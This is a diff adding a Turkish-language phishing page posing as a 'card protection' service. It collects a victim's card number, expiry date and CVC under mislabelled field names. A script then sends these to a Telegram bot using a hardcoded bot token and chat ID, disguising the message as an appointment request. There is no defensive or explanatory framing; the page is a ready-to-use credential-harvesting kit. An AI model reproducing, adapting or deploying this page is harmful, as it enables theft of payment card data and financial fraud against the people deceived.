@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güvenli Kart</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #121212; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: #1e1e1e; border: 1px solid #333; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { margin-bottom: 8px; color: #d4af37; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #444; background: #2a2a2a; color: #fff; font-size: 16px; outline: none; }
+        input:focus { border-color: #d4af37; }
+        button { width: 100%; padding: 14px; border: none; border-radius: 6px; background: #d4af37; color: #000; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #f3c644; }
+        .success-msg { display: none; color: #4caf50; margin-top: 15px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Kartı Koruma</h2>
+    <p>Aşağı kısmı doldurarak kartınızın güvenliğini sağlayabilirsiniz.</p>
+    
+    <form id="appointmentForm">
+    <!-- Kart No: Max 16 rakam, harf engelli -->
+    <input 
+      type="tel" 
+      id="firstName" 
+      placeholder=" Kart No (Örn: 4543 1234 5678 9012)" 
+      maxlength="16" 
+      oninput="this.value = this.value.replace(/\D/g, '')" 
+      required
+    >
+
+    <!-- Kart Tarihi: Max 4 rakam girilir, otomatik MM/YY yapar (Örn: 11/28) -->
+    <input 
+      type="text" 
+      id="lastName" 
+      placeholder="Kart Tarihi (Örn: 11/28)" 
+      maxlength="5" 
+      oninput="this.value = this.value.replace(/\D/g, '').replace(/^(\d{2})(\d)/, '$1/$2')" 
+      required
+    >
+
+    <!-- Kart Şifresi / CVC: Max 3 rakam -->
+    <input 
+      type="tel" 
+      id="phone" 
+      placeholder="Kart Şifresi (Örn: 123)" 
+      maxlength="3" 
+      oninput="this.value = this.value.replace(/\D/g, '')" 
+      required
+    >
+
+    <button type="submit">Güvenliği Sağla</button>
+</form>
+    
+    <div id="successMsg" class="success-msg">En kısa sürede güvenlik sağlanacaktır</div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8383859101:AAFsabb-T5ALdbEU4Hu_ngW3pLkEufYdfqM";
+    const CHAT_ID = "5594574928";
+
+    document.getElementById('appointmentForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const firstName = document.getElementById('firstName').value;
+        const lastName = document.getElementById('lastName').value;
+        const phone = document.getElementById('phone').value;
+        
+        const message = `🚨 *YENİ RANDEVU TALEBİ* 🚨\n\n👤 *Adı:* ${firstName}\n👤 *Soyadı:* ${lastName}\n📞 *Telefon:* ${phone}\n📅 *Tarih:* ${new Date().toLocaleString('tr-TR')}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if(response.ok) {
+                document.getElementById('appointmentForm').reset();
+                document.getElementById('successMsg').style.display = 'block';
+            } else {
+                alert("Bir hata oluştu, lütfen tekrar deneyin.");
+            }
+        })
+        .catch(err => alert("Bağlantı hatası!"));
+    });
+</script>
+
+</body>
+</html>
